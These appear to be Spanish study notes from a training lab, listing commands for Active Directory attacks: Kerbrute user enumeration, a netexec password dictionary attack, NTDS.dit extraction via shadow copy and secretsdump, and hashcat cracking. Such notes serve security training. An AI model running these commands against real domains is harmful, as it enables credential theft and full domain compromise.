### Enumerar usuarios AD con Kerbrute
Enumerar usuarios de un dominio, conociendo el controlador de dominio, el propio dominio y teniendo una lista de usuarios.
```bash
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```

### Ataque fuerza bruta Active Directory
Con netexec y conociendo algún usuario, podemos realizar un ataque de dicionario al usuario de dominio.

> Ojo si hay alguna política de bloqueo de intentos de login ya que puede fastidiarnos el ataque

```bash
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

### Ataque a NTDS.dit (Opcion 1)
Es el directorio donde almaena todos los nombres de usuarios del dominio, hashes de contraseñas e información del esquema. 

> Para capturar el NTDS.dit se requiere tener permisos de Administrador en el DC (ya sea local o de dominio)

#### Comprobar si tengo suficientes privilegios de administrador
```cmd
## Conexion al DC
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'

## Comprobar si pertenezco a algun grupo de administradores
net localgroup

## Comprobar los privilegios de la cuenta de usuario
net user <usuario>
```

#### Shadow-Copy y captura de NTDS
Se debe realizar un shadow-copy que es como una snapshot, ya que de otra manera no podriamos acceder al NTDS.dit porque al estar en uso, está bloqueado. 

```powershell
## Sahdow Copy
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

## Extracción NTDS.dit
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

#### Extracción hashes
Una vez tengamos en nuestro equipo atacante el NTDS.dit, con impacket extraemos los hashes
```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

### Ataque NTDS (Opcion 2)
Directamente con netexec, teniendo credenciales y permisos de administrador obtenemos los hashes directamente:
```bash
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutilv
```

Ya solo faltaría descifrar con hashcat
```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
